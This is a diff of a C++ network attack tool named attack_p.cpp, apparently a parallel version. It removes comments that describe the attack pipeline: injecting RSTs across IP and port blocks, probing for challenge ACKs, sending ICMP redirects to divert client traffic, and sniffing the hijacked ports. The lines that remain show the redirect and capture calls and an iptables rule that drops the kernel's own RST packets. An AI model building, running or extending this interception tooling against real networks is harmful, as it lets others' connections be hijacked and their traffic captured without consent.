@@ -1,16 +1,6 @@
 /*
  * attack_p.cpp  —  parallel version (block-parallel)
  *
- * One thread per block. Each block thread tests ALL ports simultaneously:
- *   RST all (IPs x ports) -> nat_wait -> SYN all ports -> probe_block window
- *   -> for each c-ACK: ARP resolve + ICMP redirect
- *   -> spawn_capture_ports for ALL c-ACK ports in one session
- *
- * If n ports all have active clients in the same block, probe_block collects
- * n c-ACKs. We send n redirects (one per port, to all IPs in block — each
- * client only acts on the redirect matching its own connection). The capture
- * session sniffs all n ports simultaneously.
- *
  * NOTE: suppress kernel RST responses before running:
  *   sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
  *
@@ -120,7 +110,7 @@ static void block_worker(
         icmp_redirect(block, port, seq, iface, sender, self_mac, gw_mac, block_macs);
     }
 
-    // 7. Spawn ONE capture session covering all c-ACK ports simultaneously
+  
     println(ts() + prefix + "capture session started (" + to_string(SNIFF_WAIT) + "s, " +
             to_string(cack_ports.size()) + " port(s)).");
     thread cap = spawn_capture_ports(block, cack_ports, SNIFF_WAIT, cap_log, log_mtx);
